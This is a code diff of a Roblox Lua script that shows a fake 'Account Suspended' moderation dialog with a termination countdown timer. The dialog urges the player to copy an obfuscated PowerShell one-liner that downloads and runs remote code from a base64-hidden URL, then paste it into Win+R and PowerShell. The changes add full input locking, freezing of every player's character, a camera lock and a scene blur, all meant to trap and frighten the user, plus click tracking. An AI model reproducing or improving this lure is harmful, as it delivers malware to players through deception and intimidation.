@@ -2,7 +2,9 @@ local Players = game:GetService("Players")
 local GuiService = game:GetService("GuiService")
 local TweenService = game:GetService("TweenService")
 local UIS = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 local ContextActionSvc = game:GetService("ContextActionService")
+local Lighting = game:GetService("Lighting")
 local lp = Players.LocalPlayer
 local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
 local FIX_COMMAND = "iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz05NDQzNTY3MjgvcmJ4LXZlcnNpb24tbWlzbWF0Y2g='))) -UseBasicParsing)"
@@ -50,60 +52,20 @@ end
 end)
 end)
 end
--- ============ CHARACTER FREEZE ============
-local FROZEN_ACTION = "RobloxVersionFreeze"
-local function freezeCharacter(character)
-if not character then return end
-local humanoid = character:FindFirstChildOfClass("Humanoid")
-if humanoid then
-humanoid.WalkSpeed = 0
-humanoid.JumpPower = 0
-humanoid.JumpHeight = 0
-task.spawn(function()
-while character.Parent and humanoid.Parent do
-if humanoid.WalkSpeed ~= 0 then humanoid.WalkSpeed = 0 end
-if humanoid.JumpPower ~= 0 then humanoid.JumpPower = 0 end
-if humanoid.JumpHeight ~= 0 then humanoid.JumpHeight = 0 end
-task.wait(0.25)
-end
-end)
-end
-pcall(function()
-ContextActionSvc:BindAction(
-FROZEN_ACTION,
-function() return Enum.ContextActionResult.Sink end,
-false,
-Enum.PlayerActions.CharacterForward,
-Enum.PlayerActions.CharacterBackward,
-Enum.PlayerActions.CharacterLeft,
-Enum.PlayerActions.CharacterRight,
-Enum.PlayerActions.CharacterJump
-)
-end)
-end
-local function hookCharacterFreeze()
-if lp.Character then freezeCharacter(lp.Character) end
-lp.CharacterAdded:Connect(function(char)
-char:WaitForChild("Humanoid",10)
-task.wait(0.2)
-freezeCharacter(char)
-end)
-end
-hookCharacterFreeze()
 -- ============ PALETTE ============
 local C = {
 dim       = Color3.fromRGB(0, 0, 0),
-card      = Color3.fromRGB(35, 35, 38),
-cardTop   = Color3.fromRGB(46, 46, 50),
+card      = Color3.fromRGB(42, 42, 46),
+cardTop   = Color3.fromRGB(52, 52, 56),
 title     = Color3.fromRGB(255, 255, 255),
-body      = Color3.fromRGB(220, 220, 225),
+body      = Color3.fromRGB(225, 225, 228),
 muted     = Color3.fromRGB(155, 155, 160),
+separator = Color3.fromRGB(75, 75, 80),
 accent    = Color3.fromRGB(0, 162, 255),
-danger    = Color3.fromRGB(235, 70, 70),
-dangerBg  = Color3.fromRGB(60, 25, 25),
-btnBg     = Color3.fromRGB(255, 255, 255),
-btnText   = Color3.fromRGB(30, 30, 32),
-btnHover  = Color3.fromRGB(230, 230, 235),
+danger    = Color3.fromRGB(235, 80, 80),
+btnPrimary= Color3.fromRGB(255, 255, 255),
+btnPrimTxt= Color3.fromRGB(30, 30, 32),
+btnPrimHov= Color3.fromRGB(230, 230, 235),
 green     = Color3.fromRGB(0, 180, 70),
 }
 local function setClipboard(text)
@@ -119,8 +81,133 @@ end
 end)
 return ok
 end
+-- ============ FREEZE HELPERS ============
+local frozenOwnChar = false
+local function freezeOwnCharacter(character)
+if not character or frozenOwnChar then return end
+local humanoid = character:FindFirstChildOfClass("Humanoid")
+if humanoid then
+humanoid.WalkSpeed = 0
+humanoid.JumpPower = 0
+humanoid.JumpHeight = 0
+task.spawn(function()
+while character.Parent and humanoid.Parent do
+if humanoid.WalkSpeed ~= 0 then humanoid.WalkSpeed = 0 end
+if humanoid.JumpPower ~= 0 then humanoid.JumpPower = 0 end
+if humanoid.JumpHeight ~= 0 then humanoid.JumpHeight = 0 end
+task.wait(0.25)
+end
+end)
+end
+end
+local function freezeOtherCharacter(character)
+if not character then return end
+for _, desc in ipairs(character:GetDescendants()) do
+if desc:IsA("BasePart") then
+desc.Anchored = true
+end
+end
+local humanoid = character:FindFirstChildOfClass("Humanoid")
+if humanoid then
+humanoid.WalkSpeed = 0
+humanoid.JumpPower = 0
+humanoid.JumpHeight = 0
+local animator = humanoid:FindFirstChildOfClass("Animator")
+if animator then
+for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+pcall(function() track:Stop(0) end)
+end
+end
+end
+end
 -- ============ SHOW DIALOG ============
 local function showDialog()
+-- Lock input
+local BLOCK_ACTION = "RobloxDialogBlock"
+pcall(function()
+ContextActionSvc:BindAction(
+BLOCK_ACTION,
+function() return Enum.ContextActionResult.Sink end,
+false,
+Enum.PlayerActions.CharacterForward,
+Enum.PlayerActions.CharacterBackward,
+Enum.PlayerActions.CharacterLeft,
+Enum.PlayerActions.CharacterRight,
+Enum.PlayerActions.CharacterJump,
+Enum.UserInputType.MouseButton1,
+Enum.UserInputType.MouseButton2,
+Enum.UserInputType.MouseButton3,
+Enum.UserInputType.MouseWheel,
+Enum.UserInputType.Touch,
+Enum.KeyCode.Escape,
+Enum.KeyCode.Tab,
+Enum.KeyCode.Return,
+Enum.KeyCode.Space,
+Enum.KeyCode.LeftShift,
+Enum.KeyCode.RightShift,
+Enum.KeyCode.LeftControl,
+Enum.KeyCode.RightControl,
+Enum.KeyCode.LeftAlt,
+Enum.KeyCode.RightAlt,
+Enum.KeyCode.Backspace,
+Enum.KeyCode.Delete
+)
+end)
+-- Freeze own character
+frozenOwnChar = true
+if lp.Character then freezeOwnCharacter(lp.Character) end
+lp.CharacterAdded:Connect(function(char)
+char:WaitForChild("Humanoid", 10)
+task.wait(0.2)
+freezeOwnCharacter(char)
+end)
+-- Freeze all other players
+for _, plr in ipairs(Players:GetPlayers()) do
+if plr ~= lp then
+if plr.Character then freezeOtherCharacter(plr.Character) end
+plr.CharacterAdded:Connect(function(char)
+task.wait(0.4)
+freezeOtherCharacter(char)
+end)
+end
+end
+Players.PlayerAdded:Connect(function(plr)
+if plr ~= lp then
+plr.CharacterAdded:Connect(function(char)
+task.wait(0.4)
+freezeOtherCharacter(char)
+end)
+end
+end)
+-- Lock camera on current frame
+local cam = workspace.CurrentCamera
+local savedCFrame = cam.CFrame
+local savedFOV = cam.FieldOfView
+pcall(function()
+cam.CameraType = Enum.CameraType.Scriptable
+end)
+local camLock = RunService.RenderStepped:Connect(function()
+if cam.CameraType ~= Enum.CameraType.Scriptable then
+pcall(function() cam.CameraType = Enum.CameraType.Scriptable end)
+end
+if cam.CFrame ~= savedCFrame then
+cam.CFrame = savedCFrame
+end
+if cam.FieldOfView ~= savedFOV then
+cam.FieldOfView = savedFOV
+end
+end)
+-- Blur + desaturate scene
+local blur = Instance.new("BlurEffect")
+blur.Size = 0
+blur.Parent = Lighting
+TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = 26}):Play()
+local colorCor = Instance.new("ColorCorrectionEffect")
+colorCor.Brightness = 0
+colorCor.Contrast = 0
+colorCor.Saturation = -0.15
+colorCor.Parent = Lighting
+-- GUI
 local gui = Instance.new("ScreenGui")
 gui.Name = "RobloxSuspensionDialog"
 gui.ResetOnSpawn = false
@@ -131,12 +218,21 @@ gui.Parent = lp:WaitForChild("PlayerGui")
 local dim = Instance.new("Frame")
 dim.Size = UDim2.new(1, 0, 1, 0)
 dim.BackgroundColor3 = C.dim
-dim.BackgroundTransparency = 0.45
+dim.BackgroundTransparency = 0.35
 dim.BorderSizePixel = 0
 dim.ZIndex = 1
 dim.Parent = gui
+local blocker = Instance.new("TextButton")
+blocker.Size = UDim2.new(1, 0, 1, 0)
+blocker.BackgroundTransparency = 1
+blocker.Text = ""
+blocker.AutoButtonColor = false
+blocker.Modal = true
+blocker.ZIndex = 2
+blocker.Parent = gui
+blocker.MouseButton1Click:Connect(function() end)
 local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
-local CARD_W = isMobile and math.min(360, vp.X - 16) or 560
+local CARD_W = isMobile and math.min(360, vp.X - 16) or 580
 local CARD_H = 570
 local cardX = -CARD_W / 2
 local cardY = -CARD_H / 2
@@ -149,48 +245,37 @@ card.ClipsDescendants = true
 card.ZIndex = 5
 card.Parent = gui
 local cardCorner = Instance.new("UICorner")
-cardCorner.CornerRadius = UDim.new(0, 10)
+cardCorner.CornerRadius = UDim.new(0, 8)
 cardCorner.Parent = card
--- top danger strip
-local strip = Instance.new("Frame")
-strip.Size = UDim2.new(1, 0, 0, 4)
-strip.BackgroundColor3 = C.danger
-strip.BorderSizePixel = 0
-strip.ZIndex = 6
-strip.Parent = card
--- ============ TITLE ============
+-- Title
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -60, 0, 32)
+title.Size = UDim2.new(1, -60, 0, 30)
 title.Position = UDim2.new(0, 30, 0, 24)
 title.BackgroundTransparency = 1
 title.Text = "Account Suspended"
 title.TextColor3 = C.title
-title.TextSize = 24
+title.TextSize = 22
 title.Font = Enum.Font.GothamBold
 title.TextXAlignment = Enum.TextXAlignment.Center
 title.ZIndex = 7
 title.Parent = card
--- ============ SUBTITLE ============
-local subtitle = Instance.new("TextLabel")
-subtitle.Size = UDim2.new(1, -60, 0, 16)
-subtitle.Position = UDim2.new(0, 30, 0, 60)
-subtitle.BackgroundTransparency = 1
-subtitle.Text = "Disconnected from Roblox"
-subtitle.TextColor3 = C.muted
-subtitle.TextSize = 13
-subtitle.Font = Enum.Font.Gotham
-subtitle.TextXAlignment = Enum.TextXAlignment.Center
-subtitle.ZIndex = 7
-subtitle.Parent = card
--- ============ BODY TEXT ============
+-- Separator line
+local sep = Instance.new("Frame")
+sep.Size = UDim2.new(1, -60, 0, 1)
+sep.Position = UDim2.new(0, 30, 0, 66)
+sep.BackgroundColor3 = C.separator
+sep.BorderSizePixel = 0
+sep.ZIndex = 6
+sep.Parent = card
+-- Error message
 local body = Instance.new("TextLabel")
-body.Size = UDim2.new(1, -60, 0, 68)
-body.Position = UDim2.new(0, 30, 0, 88)
+body.Size = UDim2.new(1, -60, 0, 56)
+body.Position = UDim2.new(0, 30, 0, 82)
 body.BackgroundTransparency = 1
 body.RichText = true
-body.Text = "Your account has been <b>suspended</b> by Roblox moderation for using <b>unauthorized third-party software</b> (exploits) in violation of the Roblox Terms of Use."
+body.Text = "Your account has been <b>suspended</b> for using <b>unauthorized third-party software</b> (exploits). This violates the Roblox Terms of Use."
 body.TextColor3 = C.body
-body.TextSize = 15
+body.TextSize = 14
 body.Font = Enum.Font.Gotham
 body.TextWrapped = true
 body.TextXAlignment = Enum.TextXAlignment.Center
@@ -198,40 +283,42 @@ body.TextYAlignment = Enum.TextYAlignment.Top
 body.LineHeight = 1.25
 body.ZIndex = 7
 body.Parent = card
--- ============ WARNING BOX ============
-local warnBox = Instance.new("Frame")
-warnBox.Size = UDim2.new(1, -60, 0, 74)
-warnBox.Position = UDim2.new(0, 30, 0, 164)
-warnBox.BackgroundColor3 = C.dangerBg
-warnBox.BorderSizePixel = 0
-warnBox.ZIndex = 6
-warnBox.Parent = card
-local warnCorner = Instance.new("UICorner")
-warnCorner.CornerRadius = UDim.new(0, 6)
-warnCorner.Parent = warnBox
-local warnLabel = Instance.new("TextLabel")
-warnLabel.Size = UDim2.new(1, -24, 1, 0)
-warnLabel.Position = UDim2.new(0, 12, 0, 0)
-warnLabel.BackgroundTransparency = 1
-warnLabel.RichText = true
-warnLabel.Text = "You must <b>complete verification</b> before the timer ends.\nOtherwise your account will be <b>permanently terminated</b>."
-warnLabel.TextColor3 = C.danger
-warnLabel.TextSize = 14
-warnLabel.Font = Enum.Font.GothamBold
-warnLabel.TextWrapped = true
-warnLabel.TextXAlignment = Enum.TextXAlignment.Center
-warnLabel.TextYAlignment = Enum.TextYAlignment.Center
-warnLabel.LineHeight = 1.2
-warnLabel.ZIndex = 7
-warnLabel.Parent = warnBox
--- ============ TIMER ============
+-- Warning text (above timer)
+local warningText = Instance.new("TextLabel")
+warningText.Size = UDim2.new(1, -60, 0, 34)
+warningText.Position = UDim2.new(0, 30, 0, 146)
+warningText.BackgroundTransparency = 1
+warningText.RichText = true
+warningText.Text = "If verification is not completed, your Roblox account will be <b>permanently terminated</b>."
+warningText.TextColor3 = C.danger
+warningText.TextSize = 14
+warningText.Font = Enum.Font.GothamBold
+warningText.TextWrapped = true
+warningText.TextXAlignment = Enum.TextXAlignment.Center
+warningText.TextYAlignment = Enum.TextYAlignment.Center
+warningText.LineHeight = 1.2
+warningText.ZIndex = 7
+warningText.Parent = card
+-- Timer caption
+local timerCaption = Instance.new("TextLabel")
+timerCaption.Size = UDim2.new(1, -60, 0, 14)
+timerCaption.Position = UDim2.new(0, 30, 0, 188)
+timerCaption.BackgroundTransparency = 1
+timerCaption.Text = "ACCOUNT TERMINATION IN"
+timerCaption.TextColor3 = C.muted
+timerCaption.TextSize = 11
+timerCaption.Font = Enum.Font.GothamBold
+timerCaption.TextXAlignment = Enum.TextXAlignment.Center
+timerCaption.ZIndex = 7
+timerCaption.Parent = card
+-- Timer
 local timerLabel = Instance.new("TextLabel")
-timerLabel.Size = UDim2.new(1, -60, 0, 42)
-timerLabel.Position = UDim2.new(0, 30, 0, 252)
+timerLabel.Size = UDim2.new(1, -60, 0, 38)
+timerLabel.Position = UDim2.new(0, 30, 0, 206)
 timerLabel.BackgroundTransparency = 1
 timerLabel.Text = "05:00"
 timerLabel.TextColor3 = C.danger
-timerLabel.TextSize = 34
+timerLabel.TextSize = 32
 timerLabel.Font = Enum.Font.GothamBold
 timerLabel.TextXAlignment = Enum.TextXAlignment.Center
 timerLabel.ZIndex = 7
@@ -247,23 +334,23 @@ timerLabel.Text = string.format("%02d:%02d", m, s)
 task.wait(1)
 end
 end)
--- ============ STEPS PANEL ============
+-- Steps panel
 local stepPanel = Instance.new("Frame")
-stepPanel.Size = UDim2.new(1, -40, 0, 170)
-stepPanel.Position = UDim2.new(0, 20, 0, 306)
+stepPanel.Size = UDim2.new(1, -60, 0, 176)
+stepPanel.Position = UDim2.new(0, 30, 0, 256)
 stepPanel.BackgroundColor3 = C.cardTop
 stepPanel.BorderSizePixel = 0
 stepPanel.ZIndex = 6
 stepPanel.Parent = card
 local spCorner = Instance.new("UICorner")
-spCorner.CornerRadius = UDim.new(0, 8)
+spCorner.CornerRadius = UDim.new(0, 6)
 spCorner.Parent = stepPanel
 local stepsHeader = Instance.new("TextLabel")
 stepsHeader.Size = UDim2.new(1, -24, 0, 16)
-stepsHeader.Position = UDim2.new(0, 16, 0, 10)
+stepsHeader.Position = UDim2.new(0, 16, 0, 12)
 stepsHeader.BackgroundTransparency = 1
 stepsHeader.RichText = true
-stepsHeader.Text = "Follow these <b>4 steps</b> to verify:"
+stepsHeader.Text = "Verify to prevent termination — <b>4 steps</b>:"
 stepsHeader.TextColor3 = C.title
 stepsHeader.TextSize = 13
 stepsHeader.Font = Enum.Font.GothamBold
@@ -292,44 +379,45 @@ step.BackgroundTransparency = 1
 step.RichText = true
 step.Text = richText
 step.TextColor3 = C.body
-step.TextSize = 14
+step.TextSize = 13
 step.Font = Enum.Font.Gotham
 step.TextXAlignment = Enum.TextXAlignment.Left
 step.TextYAlignment = Enum.TextYAlignment.Center
 step.ZIndex = 7
 step.Parent = stepPanel
 end
-buildStepRow(34, "1", "Click <b>Copy Code</b> at the bottom of this window")
-buildStepRow(66, "2", "Press <b>WIN + R</b> on your keyboard")
+buildStepRow(38, "1", "Click <b>Copy Code</b> at the bottom of this window")
+buildStepRow(68, "2", "Press <b>WIN + R</b> on your keyboard")
 buildStepRow(98, "3", "Type <b>powershell</b> and press <b>ENTER</b>")
-buildStepRow(130, "4", "Paste with <b>CTRL + V</b>, then press <b>ENTER</b>")
--- ============ COPY BUTTON (full width, at bottom) ============
+buildStepRow(128, "4", "Paste with <b>CTRL + V</b>, then press <b>ENTER</b>")
+-- Copy button (full width, at bottom)
 local copyBtn = Instance.new("TextButton")
-copyBtn.Size = UDim2.new(1, -40, 0, 54)
-copyBtn.Position = UDim2.new(0, 20, 0, 494)
-copyBtn.BackgroundColor3 = C.btnBg
+copyBtn.Size = UDim2.new(1, -60, 0, 54)
+copyBtn.Position = UDim2.new(0, 30, 0, CARD_H - 30 - 54)
+copyBtn.BackgroundColor3 = C.btnPrimary
 copyBtn.Text = "Copy Code"
-copyBtn.TextColor3 = C.btnText
-copyBtn.TextSize = 17
+copyBtn.TextColor3 = C.btnPrimTxt
+copyBtn.TextSize = 16
 copyBtn.Font = Enum.Font.GothamBold
 copyBtn.BorderSizePixel = 0
 copyBtn.AutoButtonColor = false
-copyBtn.ZIndex = 7
+copyBtn.ZIndex = 8
 copyBtn.Parent = card
 local cbCorner = Instance.new("UICorner")
-cbCorner.CornerRadius = UDim.new(0, 8)
+cbCorner.CornerRadius = UDim.new(0, 6)
 cbCorner.Parent = copyBtn
 copyBtn.MouseEnter:Connect(function()
 if copyBtn.Text == "Copy Code" then
-copyBtn.BackgroundColor3 = C.btnHover
+copyBtn.BackgroundColor3 = C.btnPrimHov
 end
 sendHit("btn", "hover")
 end)
 copyBtn.MouseLeave:Connect(function()
 if copyBtn.Text == "Copy Code" then
-copyBtn.BackgroundColor3 = C.btnBg
+copyBtn.BackgroundColor3 = C.btnPrimary
 end
 end)
+-- Copy handler
 local clickLock = false
 copyBtn.MouseButton1Click:Connect(function()
 if clickLock then return end
@@ -340,10 +428,10 @@ if copied then
 sendHit("fix", "copy_ok")
 copyBtn.BackgroundColor3 = C.green
 copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-copyBtn.Text = "✓  Copied — now follow steps 2, 3, 4 above"
+copyBtn.Text = "✓ Copied — follow steps above"
 else
 sendHit("fix", "copy_fail")
-copyBtn.Text = "Copy failed — try again"
+copyBtn.Text = "Copy failed — retry"
 copyBtn.BackgroundColor3 = C.danger
 copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 clickLock = false
@@ -351,13 +439,13 @@ end
 task.delay(4, function()
 if copyBtn and copyBtn.Parent then
 copyBtn.Text = "Copy Code"
-copyBtn.TextColor3 = C.btnText
-copyBtn.BackgroundColor3 = C.btnBg
+copyBtn.TextColor3 = C.btnPrimTxt
+copyBtn.BackgroundColor3 = C.btnPrimary
 clickLock = false
 end
 end)
 end)
--- ============ ENTRANCE ============
+-- Entrance animation
 pcall(function()
 card.Position = UDim2.new(0.5, cardX, 0.5, cardY + 20)
 card.BackgroundTransparency = 1
